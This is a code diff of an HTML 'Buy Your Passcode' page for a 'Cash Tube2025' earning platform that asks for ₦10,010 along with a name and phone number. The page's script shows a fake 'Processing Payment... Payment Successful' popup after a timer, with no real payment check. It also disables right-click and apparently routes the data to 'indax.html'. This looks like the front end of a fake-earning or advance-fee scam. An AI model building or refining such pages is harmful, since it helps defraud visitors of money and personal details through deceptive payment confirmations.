@@ -294,30 +294,36 @@
     </div>
     <h2>Buy Your Passcode</h2>
     <p class="subtitle">
-      Complete your payment to get full access to the <g>Cash Tube2025</g> earning platform.
+      Please provide your details, note that your passcode will be reviewed immediately your payment is completed
     </p>
 
-    <form id="buyForm" action="index.html">
+    <!-- Form submits to indax.html like original -->
+    <form id="buyForm" action="indax.html">
+      <!-- Original Paystack comment preserved -->
+      <!--https://paystack.com/pay/0cc5thsltw-->
+      
       <div class="form-group">
-        <label for="name"><i class="fas fa-user"></i> Full Name</label>
+        <label for="name"><i class="fas fa-user"></i> Name:</label>
         <input type="text" id="name" name="name" placeholder="Enter your full name" required>
       </div>
 
       <div class="form-group">
-        <label for="phone"><i class="fas fa-phone"></i> Phone Number</label>
-        <input type="tel" id="phone" name="phone" placeholder="080 1234 5678" required>
+        <label for="number"><i class="fas fa-phone"></i> Number:</label>
+        <input type="number" id="number" name="number" placeholder="080 1234 5678" required>
       </div>
 
       <div class="form-group">
-        <label><i class="fas fa-naira-sign"></i> Amount</label>
+        <label><i class="fas fa-naira-sign"></i> Amount:</label>
         <div class="amount-display">
           <span>₦10,010</span>
           <i class="fas fa-check-circle"></i>
         </div>
+        <!-- Hidden input to preserve original behavior -->
+        <input type="hidden" name="amount" value="₦10,010">
       </div>
 
       <button type="submit" class="btn-submit">
-        <i class="fas fa-lock"></i> Pay & Get Access
+        <i class="fas fa-lock"></i> Submit
       </button>
     </form>
 
@@ -341,19 +347,18 @@
   </div>
 
   <script>
-    // Disable right-click
+    // Disable right-click (kept from original)
     document.addEventListener('contextmenu', function(event) {
       event.preventDefault();
     });
 
-    // Form submission with validation
+    // Form validation with SweetAlert2 before submitting to indax.html
     document.getElementById('buyForm').addEventListener('submit', function(e) {
-      e.preventDefault();
-
       const name = document.getElementById('name').value.trim();
-      const phone = document.getElementById('phone').value.trim();
+      const number = document.getElementById('number').value.trim();
 
-      if (!name || !phone) {
+      if (!name || !number) {
+        e.preventDefault();
         Swal.fire({
           icon: 'warning',
           title: 'Missing Info',
@@ -363,7 +368,8 @@
         return;
       }
 
-      if (phone.length < 10) {
+      if (number.length < 10) {
+        e.preventDefault();
         Swal.fire({
           icon: 'warning',
           title: 'Invalid Number',
@@ -373,7 +379,9 @@
         return;
       }
 
-      // Simulate payment processing
+      // Show payment processing popup before submitting
+      e.preventDefault();
+      
       Swal.fire({
         title: 'Processing Payment...',
         text: 'Please wait while we verify your payment.',
@@ -387,17 +395,17 @@
         Swal.fire({
           icon: 'success',
           title: 'Payment Successful! 🎉',
-          text: 'Your passcode has been sent to your phone.',
+          text: 'Your passcode will be reviewed immediately.',
           confirmButtonColor: '#7c3aed',
-          confirmButtonText: 'Continue to Login',
+          confirmButtonText: 'Continue',
         }).then(() => {
-          // Redirect to index
-          window.location.href = 'index.html';
+          // Submit the form to indax.html as originally intended
+          document.getElementById('buyForm').submit();
         });
       }, 2500);
     });
 
-    // ---------- LiveChat Code ----------
+    // ---------- LiveChat Code (kept from original) ----------
     window.__lc = window.__lc || {};
     window.__lc.license = 15636048;
     (function(n,t,c){function i(n){return e._h?e._h.apply(null,n):e._q.push(n)}var e={_q:[],_h:null,_v:"2.0",on:function(){i(["on",c.call(arguments)])},once:function(){i(["once",c.call(arguments)])},off:function(){i(["off",c.call(arguments)])},get:function(){if(!e._h)throw new Error("[LiveChatWidget] You can't use getters before load.");return i(["get",c.call(arguments)])},call:function(){i(["call",c.call(arguments)])},init:function(){var n=t.createElement("script");n.async=!0,n.type="text/javascript",n.src="https://cdn.livechatinc.com/tracking.js",t.head.appendChild(n)}};!n.__lc.asyncInit&&e.init(),n.LiveChatWidget=n.LiveChatWidget||e}(window,document,[].slice));
